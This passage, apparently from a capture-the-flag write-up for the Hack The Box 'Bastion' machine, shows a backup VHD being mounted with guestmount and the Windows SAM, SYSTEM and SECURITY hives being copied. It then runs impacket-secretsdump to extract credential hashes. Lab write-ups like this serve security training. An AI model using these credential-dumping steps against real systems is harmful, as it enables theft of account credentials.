
Also in the Directory was an Backup Directory which has multiple .vhd files. Let's download them locally!

1. Created an /mnt/vhd directory.

```
mkdir /mnt/vhd
```

2. I then navigated into my /mnt directory and utilized "guestmount" to mount the virtualdisks onto my local machine.

The second .vhd file worked.

```
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
```

3. Since we now got access to the entire filesystem we can simply dump all hashes from memory. Let's do it, but before we'll need to move the SAM, SYSTEM & SECURITY file out of read-only mounted directory.

```
cp SAM SYSTEM SECURITY /ctfs/htb/windows/bastion
```

4. Dumped all credentials from memory.

```
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```